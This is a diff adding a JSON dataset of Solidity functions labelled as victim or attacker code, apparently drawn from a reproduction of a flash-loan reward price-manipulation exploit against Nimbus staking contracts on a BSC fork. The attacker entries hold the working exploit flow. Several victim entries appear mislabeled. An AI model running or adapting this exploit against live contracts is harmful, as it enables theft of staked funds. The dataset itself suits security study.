@@ -1,0 +1,233 @@
+[
+  {
+    "contract/interface": "LockStakingRewardFixedAPY",
+    "source_type": "victim_contract",
+    "function_name": "earned",
+    "original_code": "    function earned(address account) public view override returns (uint256 totalEarned) {\n        for (uint256 i = 0; i < stakeNonces[account]; i++) {\n            totalEarned += earnedByNonce(account, i);\n        }\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LockStakingRewardFixedAPY",
+    "source_type": "victim_contract",
+    "function_name": "getReward",
+    "original_code": "    function getReward() public override nonReentrant whenNotPaused {\n        uint256 reward = earned(msg.sender);\n        if (reward > 0) {\n            for (uint256 i = 0; i < stakeNonces[msg.sender]; i++) {\n                stakeNonceInfos[msg.sender][i].stakeTime = block.timestamp;\n            }\n            rewardsPaymentToken.safeTransfer(msg.sender, reward);\n            emit RewardPaid(msg.sender, address(rewardsPaymentToken), reward);\n        }\n    }\n\n    function getRewardForUser(address user) public override nonReentrant whenNotPaused {\n        require(msg.sender == owner(), \"StakingRewardFixedAPY :: isn`t allowed to call rewards\");\n        uint256 reward = earned(user);\n        if (reward > 0) {\n            for (uint256 i = 0; i < stakeNonces[user]; i++) {\n                stakeNonceInfos[user][i].stakeTime = block.timestamp;\n            }\n            rewardsPaymentToken.safeTransfer(msg.sender, reward);\n            emit RewardPaid(user, address(rewardsPaymentToken), reward);\n        }\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LockStakingRewardFixedAPY",
+    "source_type": "victim_contract",
+    "function_name": "stake",
+    "original_code": "    function stake(uint256 amount) external override nonReentrant {\n        require(amount > 0, \"StakingRewardFixedAPY: Cannot stake 0\");\n        _stake(amount, msg.sender);\n    }\n\n    function stakeFor(uint256 amount, address user) external override nonReentrant {\n        require(amount > 0, \"StakingRewardFixedAPY: Cannot stake 0\");\n        require(user != address(0), \"StakingRewardFixedAPY: Cannot stake for zero address\");\n        _stake(amount, user);\n    }\n\n    function _stake(uint256 amount, address user) private whenNotPaused {\n        stakingToken.safeTransferFrom(msg.sender, address(this), amount);\n        uint256 amountRewardEquivalent = getEquivalentAmount(amount);\n\n        _totalSupply += amount;\n        _totalSupplyRewardEquivalent += amountRewardEquivalent;\n        _balances[user] += amount;\n\n        uint256 stakeNonce = stakeNonces[user]++;\n        stakeNonceInfos[user][stakeNonce].stakingTokenAmount = amount;\n        stakeNonceInfos[user][stakeNonce].stakeTime = block.timestamp;\n        stakeNonceInfos[user][stakeNonce].rewardRate = rewardRate;\n        stakeNonceInfos[user][stakeNonce].rewardsTokenAmount = amountRewardEquivalent;\n        _balancesRewardEquivalent[user] += amountRewardEquivalent;\n        emit Staked(user, amount);\n    }\n\n\n\n    //A user can withdraw its staking tokens even if there is no rewards tokens on the contract account\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "BiswapCall",
+    "original_code": "    function BiswapCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        payable(address(0)).transfer(address(this).balance);\n        WBNB.withdraw(WBNB.balanceOf(address(this)));\n        NBU_WBNB.deposit{value: address(this).balance}();\n        NBU_WBNB.approve(address(NimbusRouter), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(NBU_WBNB);\n        path[1] = address(NIMB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            NBU_WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        ); // Reward Price Manipulation\n        user1.getReward();\n        // GNIMB.transfer(address(stakingReward1), stakingReward1.balanceOf(address(user1)) - GNIMB.balanceOf(address(stakingReward1)));\n        // user1.withdraw();\n        GNIMB.transfer(\n            address(stakingReward2), stakingReward2.earned(address(user2)) - GNIMB.balanceOf(address(stakingReward2))\n        );\n        user2.getReward();\n        GNIMB.transfer(\n            address(stakingReward3), stakingReward3.earned(address(user3)) - GNIMB.balanceOf(address(stakingReward3))\n        );\n        user3.getReward();\n        NIMB.approve(address(NimbusRouter), type(uint256).max);\n        path[0] = address(NIMB);\n        path[1] = address(NBU_WBNB);\n        NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            NIMB.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n        GNIMBToNBU_WBNB();\n        NBU_WBNB.withdraw(NBU_WBNB.balanceOf(address(this)));\n        address(WBNB).call{value: address(this).balance}(\"\");\n        WBNB.transfer(address(Pair), flashSwapAmount * 1000 / 998 + 1000);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "DPPFlashLoanCall",
+    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        flashSwapAmount = WBNB.balanceOf(address(Pair)) - 1e18;\n        Pair.swap(flashSwapAmount, 0, address(this), new bytes(1));\n        WBNB.transfer(dodo, flashLoanAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23_639_507);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        user1 = new User1();\n        user2 = new User2();\n        user3 = new User3();\n        NBU_WBNB.deposit{value: 20 ether}();\n        NBU_WBNB.transfer(address(user1), 16 ether);\n        NBU_WBNB.transfer(address(user2), 2 ether);\n        NBU_WBNB.transfer(address(user3), 2 ether);\n        user1.stake();\n        user2.stake();\n        user3.stake();\n        cheats.warp(block.timestamp + 8 * 24 * 60 * 60);\n        flashLoanAmount = WBNB.balanceOf(dodo);\n        DVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "user1",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "user2",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "user3",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n    \n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "NimbusBNB",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint256 nonce) public override nonReentrant whenNotPaused {\n        require(stakeNonceInfos[msg.sender][nonce].stakingTokenAmount > 0, \"StakingRewardFixedAPY: This stake nonce was withdrawn\");\n        uint256 amount = stakeNonceInfos[msg.sender][nonce].stakingTokenAmount;\n        uint256 amountRewardEquivalent = stakeNonceInfos[msg.sender][nonce].rewardsTokenAmount;\n        _totalSupply -= amount;\n        _totalSupplyRewardEquivalent -= amountRewardEquivalent;\n        _balances[msg.sender] -= amount;\n        _balancesRewardEquivalent[msg.sender] -= amountRewardEquivalent;\n        stakeNonceInfos[msg.sender][nonce].stakingTokenAmount = 0;\n        stakeNonceInfos[msg.sender][nonce].rewardsTokenAmount = 0;\n        stakingToken.safeTransfer(msg.sender, amount);\n        \n        emit Withdrawn(msg.sender, amount);\n    }\n\n",
+    "description": ""
+  }
+]
